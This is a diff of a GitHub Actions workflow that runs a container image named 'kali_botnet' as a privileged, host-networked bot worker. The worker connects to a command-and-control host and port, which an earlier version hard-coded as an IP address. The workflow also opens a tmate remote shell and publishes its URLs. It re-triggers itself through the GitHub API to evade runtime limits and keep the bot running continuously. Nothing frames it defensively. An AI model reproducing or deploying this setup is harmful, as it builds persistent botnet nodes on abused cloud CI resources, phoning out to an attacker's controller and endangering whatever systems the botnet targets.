@@ -1,4 +1,4 @@
-name: Bot Auto
+name: Run Bot with Auto-Restart and tmate
 
 on:
   workflow_dispatch:
@@ -6,48 +6,104 @@ on:
 jobs:
   run-bot:
     runs-on: ubuntu-latest
-    timeout-minutes: 360 # 6 hours
+    timeout-minutes: 360
 
     env:
       GH_TOKEN: ${{ secrets.GH_TOKEN }}
       DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
-      CONTROLLER_HOST: 147.185.221.212
-      CONTROLLER_PORT: 2472
+      DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}
+      CONTROLLER_HOST: ${{ secrets.CONTROLLER_HOST }}
+      CONTROLLER_PORT: ${{ secrets.CONTROLLER_PORT }}
 
     steps:
-      - name: Pull latest bot image
-        run: |
-          IMAGE="${DOCKERHUB_USERNAME}/kali_botnet:botv1"
-          echo "Pulling $IMAGE"
-          docker pull $IMAGE
+      - name: Checkout Repo
+        uses: actions/checkout@v3
 
-      - name: Start bot container
+      - name: Login to Docker Hub
         run: |
-          IMAGE="${DOCKERHUB_USERNAME}/kali_botnet:botv1"
-          docker run -d --name=kali_bot --privileged --network=host $IMAGE tail -f /dev/null
+          set -x
+          echo "$DOCKERHUB_PASSWORD" | docker login -u "$DOCKERHUB_USERNAME" --password-stdin
 
-      - name: Launch Bot App
+      - name: Pull Bot Image
         run: |
-          docker exec kali_bot bash -c "tmux new -d -s bot 'python3 /app/controller/worker/worker.py --host ${CONTROLLER_HOST} --port ${CONTROLLER_PORT}'"
+          set -x
+          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:botv1
+          docker pull $IMAGE_NAME
 
-      - name: Keep Alive & Auto-Restart
+      - name: Remove Old Bot Container
+        run: |
+          set -x
+          docker rm -f kali_bot || true
+
+      - name: Run Bot Container
+        run: |
+          set -x
+          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:botv1
+          docker run -d --name=kali_bot \
+            --privileged \
+            --network=host \
+            -e CONTROLLER_HOST=$CONTROLLER_HOST \
+            -e CONTROLLER_PORT=$CONTROLLER_PORT \
+            $IMAGE_NAME \
+            tail -f /dev/null
+          sleep 5
+          docker ps -a
+
+      - name: Start Bot Services
+        run: |
+          set -x
+          docker exec kali_bot tmux new -d -s bot "python3 /app/controller/worker/worker.py --host $CONTROLLER_HOST --port $CONTROLLER_PORT"
+          docker exec kali_bot tmux ls
+
+      - name: Start detached tmate session
+        run: |
+          set -e
+          sudo apt-get update -y
+          sudo apt-get install -y tmate
+          export TMATE_SOCK=/tmp/tmate.sock
+          tmate -S $TMATE_SOCK new-session -d
+          for i in $(seq 1 30); do
+            SSH_URL=$(tmate -S $TMATE_SOCK display -p '#{tmate_ssh}')
+            if [ -n "$SSH_URL" ]; then break; fi
+            sleep 1
+          done
+          if [ -z "$SSH_URL" ]; then
+            echo "tmate failed to start."
+            tmate -S $TMATE_SOCK show-messages || true
+            exit 1
+          fi
+          echo "================= TMATE CONNECTION INFO ================="
+          echo "SSH  : $SSH_URL"
+          echo "WEB  : $(tmate -S $TMATE_SOCK display -p '#{tmate_web}')"
+          echo "========================================================="
+
+      - name: Keep Workflow Alive & Auto-Restart
         run: |
           set -e
           start_time=$(date +%s)
-          max_runtime=$((5 * 3600 + 1800)) # 5h30m
+          max_runtime=$((5 * 3600 + 1800)) # 5.5 hours
+
+          trap 'echo "[Trap] SIGTERM caught. Restarting workflow..."; \
+                curl -s -o /dev/null -w "[HTTP %{http_code}] Triggered workflow\n" \
+                  -X POST \
+                  -H "Accept: application/vnd.github+json" \
+                  -H "Authorization: Bearer $GH_TOKEN" \
+                  https://api.github.com/repos/${{ github.repository }}/actions/workflows/bot.yml/dispatches; \
+                exit 0' TERM
 
           while true; do
             now=$(date +%s)
             uptime=$((now - start_time))
-            echo "Uptime: $((uptime/60)) min"
+            echo "[$(date)] Uptime: $((uptime / 60)) minutes"
+
             if [ "$uptime" -ge "$max_runtime" ]; then
-              echo "Auto-restarting workflow..."
+              echo "[$(date)] Max runtime reached. Restarting workflow..."
               sleep 5
-              curl -s -o /dev/null -X POST \
+              curl -s -o /dev/null -w "[HTTP %{http_code}] Triggered workflow\n" \
+                -X POST \
                 -H "Accept: application/vnd.github+json" \
                 -H "Authorization: Bearer $GH_TOKEN" \
-                https://api.github.com/repos/${{ github.repository }}/actions/workflows/bot.yml/dispatches \
-                -d '{"ref":"main"}'
+                https://api.github.com/repos/${{ github.repository }}/actions/workflows/bot.yml/dispatches
               exit 0
             fi
             sleep 60
